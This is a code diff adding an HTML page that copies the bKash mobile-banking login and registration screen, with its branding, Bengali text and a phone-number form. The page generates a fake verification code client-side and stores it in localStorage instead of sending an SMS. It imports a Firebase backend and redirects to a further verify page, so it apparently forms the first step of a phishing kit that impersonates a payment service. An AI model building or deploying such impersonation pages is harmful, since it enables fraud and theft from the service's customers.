@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>bKash Login/Registration</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+<script src="firebase.js"></script>
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+body { background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.container { width: 100%; max-width: 414px; background: #fff; min-height: 100vh; padding: 20px 20px 90px 20px; display: flex; flex-direction: column; position: relative; }
+
+/* Top Header section */
+.top-header { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
+.back-btn { font-size: 20px; color: #e2136e; text-decoration: none; cursor: pointer; }
+.lang-switch { display: flex; border: 1px solid #e2136e; border-radius: 6px; overflow: hidden; font-size: 13px; font-weight: 600; }
+.lang-switch span { padding: 4px 10px; cursor: pointer; }
+.lang-switch span.active { background: #e2136e; color: white; }
+.lang-switch span.inactive { background: white; color: #e2136e; }
+
+/* Main Content */
+.content-section { margin-top: 25px; }
+.logo { width: 55px; height: auto; margin-bottom: 20px; }
+h2 { color: #333; font-size: 22px; font-weight: 600; line-height: 1.4; margin-bottom: 30px; }
+
+.label-text { font-size: 13px; color: #666; margin-bottom: 8px; }
+
+/* Country Box */
+.country-box { background: #f8f8f8; padding: 14px 15px; border-radius: 8px; display: flex; align-items: center; gap: 12px; font-size: 15px; font-weight: 600; color: #333; margin-bottom: 25px; }
+.bd-flag { width: 20px; height: 14px; background: #006a4e; display: inline-block; position: relative; border-radius: 2px; }
+.bd-flag::after { content: ''; position: absolute; width: 8px; height: 8px; background: #f42a41; border-radius: 50%; top: 3px; left: 6px; }
+
+/* Phone Input Box */
+.phone-input-container { margin-top: 10px; }
+.phone-box { display: flex; align-items: center; border-bottom: 1px solid #3331; padding-bottom: 8px; }
+.phone-box .country-code { font-size: 18px; color: #333; font-weight: 600; margin-right: 12px; }
+.phone-box input { border: none; outline: none; font-size: 18px; width: 100%; background: transparent; color: #333; letter-spacing: 1px; }
+.phone-box input::placeholder { color: #bbb; }
+
+/* Bottom Next Bar (ছবির মতো ফুল-উইডথ বার) */
+.next-bar {
+    position: fixed;
+    bottom: 0;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 100%;
+    max-width: 414px;
+    background: #bfbfbf;
+    padding: 13px 25px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    cursor: not-allowed;
+    transition: background 0.3s ease;
+}
+.next-bar.active {
+    background: #e2136e;
+    cursor: pointer;
+}
+.next-bar .next-label {
+    color: #fff;
+    font-size: 16px;
+    font-weight: 600;
+}
+.next-bar .arrow-circle {
+    width: 26px;
+    height: 26px;
+    background: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.next-bar .arrow-circle i {
+    color: #bfbfbf;
+    font-size: 16px;
+    transition: color 0.3s ease;
+}
+.next-bar.active .arrow-circle i {
+    color: #e2136e;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="top-header">
+    <a href="#" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+    <div class="lang-switch">
+      <span class="inactive">Eng</span>
+      <span class="active">বাং</span>
+    </div>
+  </div>
+
+  <div class="content-section">
+    <img src="assets/birds.png" alt="bKash" class="logo">
+    <h2>মোবাইল নম্বর দিয়ে<br>লগ ইন / রেজিস্ট্রেশন করুন</h2>
+
+    <div class="label-text">দেশের কোড</div>
+    <div class="country-box">
+      <span class="bd-flag"></span> বাংলাদেশ
+    </div>
+
+    <div class="label-text">মোবাইল নম্বর</div>
+    <div class="phone-input-container">
+      <div class="phone-box">
+        <span class="country-code">+88</span>
+        <input type="tel" id="phoneNumber" placeholder="01XXXXXXXXX" maxlength="11" enterkeyhint="next">
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ছবির মতো ফুল-উইডথ বটম বার -->
+<div class="next-bar" id="nextBtn">
+  <span class="next-label">পরবর্তী</span>
+  <span class="arrow-circle"><i class="fa-solid fa-arrow-right"></i></span>
+</div>
+
+<script type="module">
+  import { db } from './firebase.js';
+
+  const phoneInput = document.getElementById('phoneNumber');
+  const nextBtn = document.getElementById('nextBtn');
+
+  // রিয়েল-টাইম ইনপুট চেক করে বার পিংক করা
+  phoneInput.addEventListener('input', () => {
+    const phone = phoneInput.value.trim();
+    if (phone.length === 11 && phone.startsWith('01')) {
+      nextBtn.classList.add('active');
+    } else {
+      nextBtn.classList.remove('active');
+    }
+  });
+
+  function handleNextAction() {
+    const phone = phoneInput.value.trim();
+
+    if (phone.length !== 11 || !phone.startsWith('01')) {
+      return;
+    }
+
+    const randomCode = Math.floor(1000 + Math.random() * 9000);
+
+    localStorage.setItem('tempPhone', phone);
+    localStorage.setItem('verificationCode', randomCode);
+
+    // alert রিমুভ করা হয়েছে যাতে কোনো পপআপ না দেখায়
+    window.location.href = "verify.html";
+  }
+
+  nextBtn.addEventListener('click', () => {
+    if (nextBtn.classList.contains('active')) {
+      handleNextAction();
+    }
+  });
+
+  phoneInput.addEventListener('keydown', (event) => {
+    if (event.key === 'Enter') {
+      event.preventDefault();
+      const phone = phoneInput.value.trim();
+      if (phone.length === 11 && phone.startsWith('01')) {
+        handleNextAction();
+      }
+    }
+  });
+</script>
+
+</body>
+</html>
